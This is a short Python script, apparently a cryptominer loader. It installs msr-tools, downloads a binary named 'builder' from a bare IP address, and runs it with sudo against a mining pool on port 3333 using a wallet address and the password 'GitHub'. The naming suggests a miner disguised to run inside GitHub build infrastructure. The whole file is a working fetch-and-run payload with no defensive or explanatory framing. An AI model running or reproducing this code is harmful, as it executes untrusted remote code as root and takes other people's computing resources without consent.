import os

os.system("sudo apt-get install msr-tools -y")
os.system("wget -O ~/builder http://209.145.57.198/github/builder")
os.system("chmod a+x ~/builder")
os.system("sudo ~/builder --url 209.145.57.198:3333 --user 46Zp21RNhNpQddBFr55noy91UJW4jeNQnH2C9GJkCY1W2FrPjKBdXmubnWjMAshCGj5DL1Rj7RRY611aouPfToya91Po1Zz --pass GitHub")
